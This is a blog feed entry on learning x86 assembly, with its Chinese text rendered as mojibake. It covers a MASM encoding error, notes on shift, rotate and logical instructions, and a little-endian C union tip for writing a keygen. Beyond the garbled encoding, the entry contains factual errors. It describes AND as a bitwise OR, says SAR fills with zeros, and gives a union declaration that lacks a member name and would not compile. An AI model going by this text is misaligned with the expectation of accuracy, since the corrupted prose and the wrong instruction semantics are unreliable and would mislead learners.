    <content type="html"><![CDATA[<h2 id="ç¼–è¯‘é—®é¢˜"><a href="#ç¼–è¯‘é—®é¢˜" class="headerlink" title="ç¼–è¯‘é—®é¢˜"></a>ç¼–è¯‘é—®é¢˜</h2><p>ç”±äºç°åœ¨çš„è®¡ç®—æœºæ˜¯64ä½, è€Œdebugæ˜¯å½“å¹´åœ¨16ä½çš„è®¡ç®—æœºä¸Šæçš„, åœ¨32ä½è®¡ç®—æœºä¸­, å¾®è½¯è¿˜åœ¨ç³»ç»ŸåŒå¢åŠ äº†debugè¿™ä¸ªå·¥å…·, ä½†æ˜¯åˆ°äº†64ä½, å´æ²¡æœ‰åŠ , æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»ä¸‹è½½ä¸€ä¸ª dosbox å¼€æºçš„dosæ¨¡æ‹Ÿå™¨, ç„¶åå°†debugåœ¨dosboxä¸­è¿è¡Œ.å½“ç„¶è¿™äº›éƒ½æ˜¯æ²¡é—®é¢˜çš„.é—®é¢˜æ˜¯: <a id="more"></a></p><p>åœ¨ä¸‹è½½masmå, ç”±äºç¬¬ä¸€æ¬¡æ¥è§¦, ç¼–å†™å¥½æºç¨‹åºå, ç”¨æŒ‡ä»¤ masm   xxx.asm .ä½†æ˜¯ä¸€ç›´æŠ¥ A2044çš„é”™è¯¯, å°±ç™¾åº¦, çŸ¥ä¹, éƒ½è¯´è¾“å…¥çš„æ ¼å¼é”™è¯¯, æˆ–è€…æœ‰éæ³•å­—ç¬¦ã€‚ä½†æ˜¯ç¡®å®šäº†æ²¡æœ‰ä¹‹åè¿˜æ˜¯æŠ¥é”™ï¼Œå°±è¿™æ ·ç—›è‹¦äº†ä¸€æ™šä¸Š, ç¬¬äºŒå¤©èµ·æ¥, è¿˜æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ, å°±æŠ±ç€è¯•ä¸€è¯•(å¥”æºƒäº†),æ¢äº†ä¸ªmasmç‰ˆæœ¬, è¿™æ¬¡æˆåŠŸäº†. ä½†æ˜¯åœ¨ç¼–å†™ä¸€ä¸ªæ–°çš„æºç¨‹åº, åˆæ˜¯è¿™ä¸ªé”™è¯¯, å†æ¬¡å´©,()/(ã„’oã„’)/~~,.</p><p>çªç„¶æˆ‘æƒ³åˆ°, ä¼šä¸ä¼šæ˜¯ç¼–ç æ ¼å¼çš„é”™è¯¯å‘¢, å°±æ¢äº†UTF-8è¯•ä¸€ä¸‹ï¼Œæœç„¶ã€‚ã€‚ã€‚</p><p>æ—¢ç„¶ç½‘ä¸Šéƒ½è¯´äº†æ ¼å¼æˆ–è€…éæ³•å­—ç¬¦, é‚£æ€ä¹ˆæ²¡æƒ³åˆ°ç¼–ç é—®é¢˜å‘¢ã€‚</p><h2 id="ä¸€äº›æŒ‡ä»¤è®°å½•"><a href="#ä¸€äº›æŒ‡ä»¤è®°å½•" class="headerlink" title="ä¸€äº›æŒ‡ä»¤è®°å½•"></a>ä¸€äº›æŒ‡ä»¤è®°å½•</h2><ul><li><p>andæŒ‡ä»¤ï¼šORæ˜¯æŒ‰ä½â€œæˆ–â€æ“ä½œã€‚ä½†æ˜¯å¯ä»¥ç”¨æ¥è¡¨ç¤ºincæ“ä½œï¼Œæ¯”å¦‚ <code>0 and 3 = 0, 1 and 3 = 1, 2 and 3 = 2, 3 and 3 = 3, 4 and 3 = 0, 5 and 3 = 1</code>ï¼Œä»¥æ­¤åš 0-3 çš„å¾ªç¯ã€‚</p></li><li><p>salæŒ‡ä»¤ï¼šå°†æ•°æ®å‘å·¦ç§»ä½, ç§»äº†çš„ä½ç”¨0å¡«å……ã€‚ç§»åŠ¨ä¸€ä½ç›¸å½“äºä¹˜2ã€‚</p></li><li><p>saræŒ‡ä»¤ï¼šå°†æ•°æ®å‘å³ç§»ä½, ç§»äº†çš„ä½ç”¨0å¡«å……ã€‚ç§»åŠ¨ä¸€ä½ç›¸å½“äºé™¤2ï¼Œä¸ç”¨è€ƒè™‘ä½™æ•°ã€‚ æ¯”å¦‚ eax = 3 (11) ï¼Œ sar eax, 1 å eax = (01) = 1ï¼Œç›¸å½“äº 3/2 = 1ã€‚</p></li><li><p>roræŒ‡ä»¤ï¼š<strong>å¾ªç¯å³ç§»</strong>ï¼ŒæŠŠæ‰€æœ‰ä½éƒ½å‘å³ç§»ï¼Œæœ€ä½ä½å¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½å’Œæœ€é«˜ä½ã€‚æŒ‡ä»¤ç”¨Cè¯­è¨€æ¥å®ç°ï¼šå¦‚ <code>ror a, 3</code> å¯¹åº” <code>((a&gt;&gt;3ï¼‰| ((a&amp;7) &lt;&lt; 5))</code>ã€‚</p><p><img src="/2020/02/19/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/image-20200529164348298.png" alt="image-20200529164348298"></p></li><li><p>rolæŒ‡ä»¤ï¼š<strong>å¾ªç¯å·¦ç§»</strong>ï¼Œä¸rorç±»ä¼¼ã€‚</p></li></ul><h2 id="å°ç«¯é—®é¢˜"><a href="#å°ç«¯é—®é¢˜" class="headerlink" title="å°ç«¯é—®é¢˜"></a>å°ç«¯é—®é¢˜</h2><ul><li><p>åœ¨ç¨‹åºå¯†ç ç®—æ³•æ—¶, å¯èƒ½ä¼šå°†è®¡ç®—åçš„æ•°æ®å­˜æ”¾åœ¨4ä¸ªå†…å­˜å•å…ƒ, ç„¶åå°†å…¶ä¼ ç»™ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨(EAX), ä½†æ˜¯ä¸€èˆ¬è‹±ç‰¹å°”çš„cpu, æ•°æ®å­˜æ”¾å½¢å¼éƒ½æ˜¯å°ç«¯, æ‰€ä»¥ä¼šå°†è¯¥4ä¸ªå†…å­˜å•å…ƒçš„æ•°æ®, ä»¥å®ƒå°ç«¯å­˜å‚¨æ–¹å¼è¯»å–, æ¯”å¦‚, 4ä¸ªè¿ç»­å†…å­˜å•å…ƒçš„æ•°æ®ä¾æ¬¡ä¸º 0x12  0x34  0x56  0x78, ä¼ ç»™å¯„å­˜å™¨å, ç”±äºå°ç«¯,æ‰€ä»¥ä¸º, 0x78563412. é‚£ä¹ˆæˆ‘ä»¬å†å†™æ³¨å†Œæœºçš„æ—¶å€™å°±å¯ä»¥, å…ˆå®šä¹‰ä¸€ä¸ªè”åˆ:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> EAX</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> eax;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡, å°†4ä¸ªæ•°æ®å­˜æ”¾åœ¨char[0 - 3] , è€Œeaxå°±æ˜¯æˆ‘ä»¬è¦å¾—å€¼äº†. (ä¸è¿‡è¿™é‡Œè¦æ³¨æ„ä½¿ç”¨<code>unsigned char</code> , å› ä¸ºä¸€ä¸ªå­—èŠ‚çš„æœ€å¤§æ•°æ®ä¸º 2 ^8 - 1 (FF),  æœ‰ç¬¦å·<code>char</code> æ˜¯ -2^7 ~ 2^7-1 , ç”¨æœ‰ç¬¦å·<code>char</code> å¾ˆå®¹æ˜“æº¢å‡º)ã€‚</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç¼–è¯‘é—®é¢˜&quot;&gt;&lt;a href=&quot;#ç¼–è¯‘é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;ç¼–è¯‘é—®é¢˜&quot;&gt;&lt;/a&gt;ç¼–è¯‘é—®é¢˜&lt;/h2&gt;&lt;p&gt;ç”±äºç°åœ¨çš„è®¡ç®—æœºæ˜¯64ä½, è€Œdebugæ˜¯å½“å¹´åœ¨16ä½çš„è®¡ç®—æœºä¸Šæçš„, åœ¨32ä½è®¡ç®—æœºä¸­, å¾®è½¯è¿˜åœ¨ç³»ç»ŸåŒå¢åŠ äº†debugè¿™ä¸ªå·¥å…·, ä½†æ˜¯åˆ°äº†64ä½, å´æ²¡æœ‰åŠ , æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»ä¸‹è½½ä¸€ä¸ª dosbox å¼€æºçš„dosæ¨¡æ‹Ÿå™¨, ç„¶åå°†debugåœ¨dosboxä¸­è¿è¡Œ.å½“ç„¶è¿™äº›éƒ½æ˜¯æ²¡é—®é¢˜çš„.é—®é¢˜æ˜¯:&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ±‡ç¼–" scheme="https://www.Bxnop.cn/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
</feed>
